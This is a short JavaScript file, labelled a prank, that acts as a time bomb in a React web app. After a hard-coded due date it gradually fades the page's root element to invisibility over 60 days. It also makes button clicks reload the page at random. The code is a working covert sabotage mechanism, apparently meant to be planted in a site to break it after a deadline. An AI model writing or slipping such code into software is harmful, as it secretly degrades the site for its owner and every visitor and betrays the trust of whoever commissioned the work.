function addPrankEventListener() {
  /* change these variables as you wish */
  var due_date = new Date("2024-04-27");
  var days_deadline = 60;
  /* stop changing here */

  var current_date = new Date();
  var utc1 = Date.UTC(
    due_date.getFullYear(),
    due_date.getMonth(),
    due_date.getDate()
  );
  var utc2 = Date.UTC(
    current_date.getFullYear(),
    current_date.getMonth(),
    current_date.getDate()
  );
  var days = Math.floor((utc2 - utc1) / (1000 * 60 * 60 * 24));

  if (days > 0) {
    var days_late = days_deadline - days;
    var opacity = (days_late * 100) / days_deadline / 100;
    opacity = opacity < 0 ? 0 : opacity;
    opacity = opacity > 1 ? 1 : opacity;
    if (opacity >= 0 && opacity <= 1) {
      // document.getElementsByTagName("BODY")[0].style.opacity = opacity;
      // document.getElementsByTagName("html")[0].style.opacity = opacity;
      document.getElementById("root").style.opacity = opacity;
    }

    // Define the percentage chance of reloading the page (0 to 100)
    const reloadPercentage = (days_late * 100) / days_deadline; // chance of reloading the page
    // const reloadPercentage = 100; // chance of reloading the page

    // Add a click event listener to all buttons on the page
    document.querySelectorAll("button").forEach((button) => {
      console.log("button.......");
      button.addEventListener("click", () => {
        // Check if we should reload the page
        // Generate a random number between 0 and 100
        const randomNumber = Math.floor(Math.random() * 100);
        // If the random number is less than the reload percentage, return true

        if (randomNumber < reloadPercentage) {
          // Reload the page
          window.location.reload();
        }
      });
    });
  }
}

// Function to wait for the React components to be fully loaded
function waitForReactComponents() {
  // Check if buttons are available in the DOM
  if (document.querySelectorAll("button").length > 0) {
    // Add the prank event listeners to all buttons
    addPrankEventListener();
  } else {
    // If buttons are not found, check again after a short delay
    setTimeout(waitForReactComponents, 1000); // Check every 1000ms
  }
}

document.addEventListener("DOMContentLoaded", () => {
  console.log("DOMContentLoaded.......");
  waitForReactComponents();
});
